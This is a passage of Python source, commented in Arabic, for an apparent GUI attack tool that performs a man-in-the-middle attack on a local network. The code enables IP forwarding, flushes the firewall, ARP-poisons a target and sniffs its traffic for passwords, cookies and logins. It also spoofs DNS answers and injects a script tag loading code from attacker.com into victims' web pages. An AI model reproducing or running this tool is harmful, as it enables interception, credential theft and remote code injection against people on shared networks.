        if not target or not gateway: self._log_system("[-] IPs Required."); return
        
        self._log_system(f"[*] Deploying modules against {target}...")
        
        # 1. تفعيل توجيه الحزم على مستوى الكيرنل (Kernel-Level Routing)
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        # توجيه حركة المرور لـ NetfilterQueue رقم 0
        os.system("iptables -F") # تنظيف الجدار الناري
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
        
        self.interceptor = PacketStriker("eth0", gateway, self.signals)
        
        # 2. تشغيل هجوم الـ ARP في Thread منفصل (Parallel Multitasking)
        threading.Thread(target=self.interceptor.arp_poison, args=(target,), daemon=True).start()
        
        # 3. تشغيل الـ Sniffer لتحليل وتصنيف الحزم عبر الـ AI
        def sniffer_loop():
            sniff(iface="eth0", prn=self.advanced_sniffer_callback, store=0)
            
        threading.Thread(target=sniffer_loop, daemon=True).start()
        
        # 4. تشغيل الـ NetfilterQueue للحقن يدوياً
        nfq_thread = threading.Thread(target=self.nfq_injection_loop, daemon=True)
        nfq_thread.start()

    def advanced_sniffer_callback(self, packet):
        if packet.haslayer(IP):
            src, dst = packet[IP].src, packet[IP].dst
            proto = self.ai.protocols_signature.get(packet[IP].proto, "UNKNOWN")
            # تحليل سلوك الحزمة عبر الـ AI لتصنيف الجهاز
            classification = self.ai.classify_device(packet)
            self.signals.update_traffic.emit(src, dst, proto, classification)
            
            # كشف وحفظ كلمات المرور المشفرة
            if packet.haslayer(Raw):
                load = packet[Raw].load.decode(errors='ignore')
                if any(p in load.lower() for p in ["pass", "user", "cookie", "login"]):
                    self.signals.new_loot.emit("CREDENTIALS", f"From {src}: Captured Data Stream")

    def nfq_injection_loop(self):
        """حلقة الـ NFQUEUE للحقن وتعديل البروتوكولات بايت بايت"""
        def nfq_handler(packet):
            scapy_pkt = IP(packet.get_payload())
            modified = False
            
            # منطق الـ DNS Spoofing اليدوي
            new_dns = self.interceptor.dns_spoof(scapy_pkt, "target-site.com.", "1.2.3.4")
            if new_dns: scapy_pkt = new_dns; modified = True
            
            # منطق حقن الـ JavaScript (بناء الحزمة يدوياً)
            if scapy_pkt.haslayer(Raw):
                load = scapy_pkt[Raw].load.decode(errors='ignore')
                if "</body>" in load:
                    self.signals.system_msg.emit("[!] Injecting Payload...")
                    payload = "<script src='http://attacker.com/h.js'></script>"
                    load = load.replace("</body>", f"{payload}</body>")
                    # تصحيح الـ Content-Length يدوياً لمنع الـ Corruption
                    cl_match = re.search(r"Content-Length:\s*(\d+)", load)
                    if cl_match:
                        new_len = int(cl_match.group(1)) + len(payload)
                        load = load.replace(cl_match.group(1), str(new_len))
                    scapy_pkt[Raw].load = load
                    del scapy_pkt[IP].len; del scapy_pkt[IP].chksum
                    if scapy_pkt.haslayer(TCP): del scapy_pkt[TCP].chksum
                    modified = True
            
            if modified: packet.set_payload(bytes(scapy_pkt))
            packet.accept()

        nfq = NetfilterQueue()
        nfq.bind(0, nfq_handler)
        try: nfq.run()
        except Exception as e: self.signals.system_msg.emit(f"[-] NFQ Error: {e}")

    def generate_report(self):
        filename = self.report_name.text()
        if not filename.endswith(".pdf"): filename += ".pdf"
        self._log_system(f"[*] Generating PDF Report: {filename}...")
        reporter = ReportEngine("system_assets.db", "JOSEPH_FAHMY_2026")
        msg = reporter.generate_pdf_report(filename)
        self._log_system(msg)

    def cleanup(self):
        """تنظيف النظام الكيرنل وتوقيف العمليات المتوازية"""
        if self.interceptor: self.interceptor.active = False
        os.system("iptables --flush")
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        self._log_system("[+] System Cleaned. All modules disengaged.")

# ==============================================================================
# ENTRY POINT (نقطة الاندماج النهائي بـ Sudo Privileges)
# ==============================================================================
if __name__ == "__main__":
    if os.getuid() != 0:
        print("!! FATAL: ROOT PRIVILEGES REQUIRED (for Raw Sockets, NFQUEUE, and Kernel Config) !!")
        sys.exit()
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    window = JosephFahmyOS()
    window.show()
    sys.exit(app.exec())
